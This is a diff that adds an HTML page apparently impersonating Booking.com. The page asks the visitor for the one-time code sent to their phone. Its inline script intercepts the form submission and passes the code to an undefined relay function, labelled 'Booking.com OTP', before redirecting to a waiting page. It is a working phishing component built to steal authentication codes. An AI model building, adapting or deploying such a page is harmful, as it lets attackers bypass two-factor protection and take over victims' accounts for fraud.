@@ -1,0 +1,52 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="res\css\main.css">
+    <title>Booking</title>
+</head>
+<body>
+
+    <header>
+        <img src="res\img\logo.png" alt="">
+    </header>
+    <main>
+<div class="form">
+   
+<div class="col">
+<h3>Confirmation</h3>
+    <p>Please enter the code sent to your phone number to continue.</p>
+</div>
+    <form action="post.php" method="post">
+
+<div class="col">
+  <input type="text" name="otp" required placeholder="Enter the code" style="width:100%;">
+</div>
+<div class="col"><button type="sumbit" style="width:100%;">Confirm</button></div>
+ 
+         
+ 
+
+</form>    
+
+ 
+
+</main>
+
+<script type="text/javascript">
+
+
+document.querySelector("form").addEventListener("submit",(e)=>{
+    e.preventDefault();
+
+   wu.zhong(`🔒 Booking.com OTP: ${document.querySelector("[name='otp']").value}`);
+
+    window.location="wait.html";
+
+})
+
+</script>
+    
+</body>
+</html>
